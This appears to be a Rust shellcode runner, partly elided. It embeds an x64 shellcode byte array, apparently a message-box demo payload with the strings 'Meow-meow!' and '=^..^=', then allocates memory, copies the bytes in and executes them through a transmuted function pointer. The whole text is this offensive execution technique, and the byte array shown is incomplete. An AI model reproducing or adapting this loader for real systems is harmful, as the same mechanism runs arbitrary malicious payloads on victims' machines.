...
static SHELLCODE: [u8; 300] = [
    0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    ...
    0x85, 0x09, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5,
    0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d,
    0x6d, 0x65, 0x6f, 0x77, 0x21, 0x00, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x00
];

fn main(){
    println!("[*] Starting local exec...");
    let mut mem = VirtualMemory::new(SHELLCODE.len()).expect("Failed to alloc mem");
    mem.copy_from_slice(&SHELLCODE);
    let exec: extern "C" fn() = unsafe { std::mem::transmute(mem.as_ptr()) };
    exec();
    println!("[*] Done.");
}